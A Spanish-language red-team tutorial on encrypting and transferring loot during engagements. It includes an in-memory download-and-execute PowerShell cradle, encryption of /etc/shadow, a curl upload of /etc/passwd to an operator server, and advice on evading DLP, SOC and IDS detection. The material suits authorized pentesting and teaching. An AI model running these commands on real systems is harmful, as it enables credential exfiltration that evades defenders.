# Transferencias de Archivos Protegidas

Durante un engagement, los archivos que se transfieren pueden contener información sensible: credenciales, hashes, datos de clientes, documentos confidenciales. Transferirlos en claro expone esa información a cualquiera que capture el tráfico de red. Además, cifrar los archivos antes de transferirlos puede ayudar a evadir soluciones de DLP (Data Loss Prevention) que inspeccionan el contenido del tráfico.

### Cifrado en Windows con Invoke-AESEncryption

PowerShell no tiene funciones nativas de cifrado AES fáciles de usar, pero se puede cargar un script en memoria para añadir esa capacidad.

```powershell
# Cargar el script de cifrado en memoria (no toca disco)
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/darkoperator/Posh-SecMod/master/Post/Invoke-AESEncryption.ps1')

# Cifrar un archivo
Invoke-AESEncryption -Mode Encrypt -Key "P@ssw0rd123!" -Path C:\Users\Public\loot.zip

# El resultado es loot.zip.aes — se transfiere este archivo
# En el destino, descifrar:
Invoke-AESEncryption -Mode Decrypt -Key "P@ssw0rd123!" -Path C:\Users\Public\loot.zip.aes
```

### Cifrado en Linux con OpenSSL

OpenSSL está disponible en prácticamente todas las distribuciones Linux y permite cifrar archivos con AES-256 sin instalar nada adicional.

```bash
# Cifrar un archivo
openssl enc -aes-256-cbc -iter 100000 -pbkdf2 \
    -in /etc/shadow \
    -out shadow.enc \
    -pass pass:SuperPassword123

# Transferir shadow.enc (cifrado)

# Descifrar en el destino
openssl enc -d -aes-256-cbc -iter 100000 -pbkdf2 \
    -in shadow.enc \
    -out shadow \
    -pass pass:SuperPassword123
```

### Transferencias cifradas con SSH / SCP

SCP cifra la transferencia completa usando el canal SSH. Es la opción más directa cuando hay acceso SSH.

```bash
# Descargar archivo desde el objetivo
scp usuario@192.168.1.50:/home/usuario/loot.tar.gz .

# Subir herramienta al objetivo
scp Rubeus.exe usuario@192.168.1.50:/tmp/

# Con clave SSH (sin contraseña)
scp -i ~/.ssh/id_rsa archivo.zip usuario@192.168.1.50:/tmp/
```

### Servidores HTTPS para transferencias cifradas

En lugar de HTTP en claro, levantar el servidor con HTTPS garantiza que el contenido no sea visible en capturas de red.

```bash
# Generar certificado autofirmado
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes \
    -subj '/CN=servidor'

# Servidor HTTPS con uploadserver
sudo python3 -m uploadserver 443 --server-certificate cert.pem

# Descargar desde el objetivo con curl (--insecure para cert autofirmado)
curl -k https://192.168.1.100/herramienta.exe -o herramienta.exe

# Subir al servidor HTTPS
curl -k -X POST https://192.168.1.100/upload -F 'files=@/etc/passwd'
```

### Cifrar con 7-Zip (Windows)

En entornos Windows donde hay 7-Zip disponible o se puede subir el binario:

```cmd
# Comprimir y cifrar con contraseña AES-256
7z a -p"ContraseñaFuerte!" -mhe=on archivo.7z archivos_a_comprimir\

# -mhe=on cifra también los nombres de archivo
# Transferir archivo.7z y descifrar en destino
7z e -p"ContraseñaFuerte!" archivo.7z
```

### Por qué cifrar las transferencias

| Riesgo sin cifrado                                          | Mitigación                                 |
| ----------------------------------------------------------- | ------------------------------------------ |
| SOC captura el tráfico y ve credenciales en claro           | Cifrar con AES o usar SCP/HTTPS            |
| DLP detecta contenido sensible (PII, hashes) en el flujo    | Cifrar antes de transferir                 |
| Evidencia forense muestra exactamente qué se exfiltró       | Cifrar dificulta el análisis del contenido |
| IDS con firmas detecta herramientas conocidas por contenido | El cifrado cambia la firma del archivo     |

> En engagements de Red Team, cifrar el loot antes de exfiltrarlo es parte de las buenas prácticas OPSEC. Un SOC que capture la transferencia solo verá datos cifrados, sin poder determinar inmediatamente qué información salió.

> Acordar siempre con el cliente cómo se gestionará el material sensible obtenido durante el pentest. Los datos capturados (credenciales, documentos) deben transferirse de forma segura, almacenarse cifrados y eliminarse de forma verificable al finalizar el engagement.
